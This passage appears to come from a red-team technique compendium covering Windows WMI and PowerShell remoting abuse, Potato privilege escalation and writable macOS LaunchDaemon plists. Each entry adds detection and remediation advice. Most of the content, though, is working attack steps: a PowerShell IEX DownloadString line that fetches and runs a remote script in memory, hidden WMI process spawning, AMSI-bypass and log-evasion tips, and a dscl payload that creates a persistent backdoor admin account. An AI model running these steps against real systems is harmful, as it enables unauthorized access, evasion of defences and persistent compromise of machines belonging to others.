-ComputerName <target-ip> -ScriptBlock { Get-WmiObject Win32_Process }• Useful for stealthy, credentialed enumeration over PS remotingStep 5 – Using Red Team Tools (Optional)• Use SharpWMI.exe to enumerate processes:SharpWMI.exe action=query query="SELECT * FROM Win32_Process"• Use Impacket’s wmiexec.py for shell:wmiexec.py <domain/user>:<pass>@<ip>Inside shell, run commands like:wmic product get name,versionStep 6 – Enumeration Targets• Users• Processes• Software• Network interfaces• System uptime• Domain/workgroup• Security productsAll of this data supports privilege escalation, AV evasion, or lateral movement planning.Step 7 – Clean Up (Optional)• WMI enumeration does not leave files or registry artifacts• Minimal forensic footprint, making detection harder than other methods
Vulnerability: Unrestricted WMI namespaces + exposed WinRM/WMI DCOM services
Impact: - Silent system profiling- AV evasion- Preparation for privilege escalation or lateral movement
Detection Method: - Enable WMI auditing- Monitor Event IDs 5861, 5860- Monitor excessive WMI queries via Sysmon (Event ID 1)- Track anomalous process creations tied to wmic.exe or powershell.exe
Solution: - Restrict WMI and DCOM usage to administrators- Enable logging for WMI queries- Implement AppLocker policies to restrict script usage- Use EDR to monitor suspicious PowerShell/WMI usage
Source: MITRE ATT&CK, HackTricks, Red Canary Intelligence, Microsoft Docs

Title: WMI + PowerShell Remoting for Evasion
Scenario Description: Attackers leverage WMI combined with PowerShell Remoting to execute commands or scripts without writing files to disk, allowing stealthy post-exploitation or lateral movement. This method abuses legitimate Windows services and communication channels, often bypassing basic antivirus and EDR detection because it avoids typical execution indicators like file drops or direct binary execution.

Attack Steps: Step 1 – Verify WinRM is EnabledOn the target machine (if attacker has access):winrm quickconfigEnsure WinRM is set to accept requests.If disabled and attacker has admin:Enable-PSRemoting -ForceStep 2 – Gather Host Information via WMI (Stealth Recon)On attack machine (or compromised host):Get-WmiObject -Class Win32_OperatingSystem -ComputerName <target-ip>Or enumerate logged-in users:Get-WmiObject -Class Win32_LoggedOnUser -ComputerName <target-ip>Step 3 – Execute Remote Command via PowerShell Remoting (In-Memory)Run commands remotely without writing to disk:Invoke-Command -ComputerName <target-ip> -ScriptBlock { Get-Process } -Credential (Get-Credential)Can also launch payloads:Invoke-Command -ComputerName <target-ip> -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('http://malicious[.]url/script.ps1') }✅ Entire script runs in memory – no file droppedStep 4 – Alternative with WMI Remote Process CreationUse WMI to spawn a process on the remote machine:Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -nop -w hidden -c <command>" -ComputerName <target-ip>This creates a PowerShell instance remotely, optionally running a stager or backdoorStep 5 – Optional Evasion Enhancements- Use -NoProfile -WindowStyle Hidden -EncodedCommand to obfuscate command- Use IEX and AMSI bypass stagers for stealth- Avoid command logging by modifying $PSDefaultParameterValuesStep 6 – CleanupNo file artifacts left, but processes and logs may remain:• Stop PowerShell sessions• Clear PowerShell history (if not already disabled)• WMI execution won’t create scripts, but logs WMI process spawningStep 7 – Key Notes- Effective for evading AVs that rely on file I/O- Common in red teaming and APT techniques- Relies on system services that are often whitelisted- Can be paired with credential theft or Pass-the-Hash for session reuse
Vulnerability: Abuse of native remote execution channels (WMI, WinRM)In-memory execution avoids detection on disk
Impact: - Silent command execution- In-memory payloads- Antivirus evasion- No disk-based artifacts
Detection Method: - Enable PowerShell logging (Module, ScriptBlock Logging)- Monitor Event ID 4104 (PowerShell)- Use Sysmon to detect process creation (ID 1)- Detect WMI process creation via Event ID 4688 or 5861
Solution: - Disable unnecessary remote access (WinRM, WMI)- Enforce JEA (Just Enough Administration)- Use constrained language mode- Implement strict logging and SIEM alerts
Source: MITRE ATT&CK, Red Canary Detection Series, Microsoft Sec Guidance, HackTricks

Title: Juicy Potato – CLSID Abuse

For modern systems, use RoguePotato, PrintSpoofer, or PotatoSuite alternatives
Impact: - Full SYSTEM-level privilege escalation- Attackers can disable AV, create users, steal hashes

Title: Rogue Potato – Modern Bypass for Juicy

Rogue Potato leverages a local HTTP COM server and NT AUTHORITY\SYSTEM impersonation via RPC abuse. It tricks the system into connecting to the attacker's local TCP listener instead of a real named pipe, enabling SYSTEM token impersonation and privilege escalation without needing a named pipe.

Title: Writable .plist Files in /Library/LaunchDaemons
Scenario Description: This technique exploits misconfigured permissions on .plist files within /Library/LaunchDaemons. If a user can modify these property list files, they can configure a launch daemon to execute arbitrary code as root during system boot or load time. Since launch daemons run with elevated privileges, a writable .plist file can be abused to gain persistent root access.
Tools Used: ✅ macOS Terminal✅ launchctl✅ nano or vi✅ chmod, chown, ls -l✅ Custom reverse shell payload or script
Attack Steps:
Step 1 – Identify Writable .plist FilesOpen Terminal and run:ls -l /Library/LaunchDaemons/*.plistLook for .plist files with write permissions for the current user or group. Example output:-rw-rw-r-- 1 user staff 512 Jul 7 15:32 com.example.vulnerable.plistStep 2 – Backup Original FileMake a copy of the file for restoration:cp /Library/LaunchDaemons/com.example.vulnerable.plist ~/backup.plistStep 3 – Modify the .plist FileOpen the file in a text editor:sudo nano /Library/LaunchDaemons/com.example.vulnerable.plistReplace or edit the ProgramArguments field to point to a script or binary you control:xml
ProgramArguments/bin/bash-c/tmp/root_payload.sh
Step 4 – Create Malicious PayloadCreate a script that adds a root user or reverse shell:echo 'dscl . -create /Users/hackroot; dscl . -create /Users/hackroot UserShell /bin/bash; dscl . -create /Users/hackroot UniqueID 401; dscl . -create /Users/hackroot PrimaryGroupID 20; dscl . -create /Users/hackroot NFSHomeDirectory /Users/hackroot; dscl . -passwd /Users/hackroot password123; dscl . -append /Groups/admin GroupMembership hackroot' > /tmp/root_payload.shMake it executable:chmod +x /tmp/root_payload.shStep 5 – Load the LaunchDaemonUse launchctl to load the modified file:sudo launchctl load /Library/LaunchDaemons/com.example.vulnerable.plistThe script will now execute as root. Verify:id hackroot or attempt su hackroot with the password.Step 6 – Cleanup (For Ethical Purposes)Unload the plist:sudo launchctl unload /Library/LaunchDaemons/com.example.vulnerable.plistRestore original file:sudo cp ~/backup.plist /Library/LaunchDaemons/com.example.vulnerable.plistDelete created user:sudo dscl . -delete /Users/hackrootRemove /tmp/root_payload.sh💡 Tip: This method does not require a kernel exploit, making it stealthier on secured macOS systems.
Vulnerability: Misconfigured file permissionsWritable .plist loaded as root
MITRE Technique: T1543.004 (Create or Modify System Process: Launch Daemon)
Impact: Full root privilege escalationPersistent backdoorPrivilege manipulation without kernel exploitation
Detection Method: - Monitor .plist file modifications- Use auditd or fs_usage- Track unauthorized launchctl load attempts
Solution: - Ensure proper permissions: only root writable- Disable unneeded daemons- Monitor LaunchDaemons directory- Use macOS SIP and JAMF policies
Source: MITRE ATT&CK, Objective-See Tools, Apple Admin Docs, HackTricks MacOS
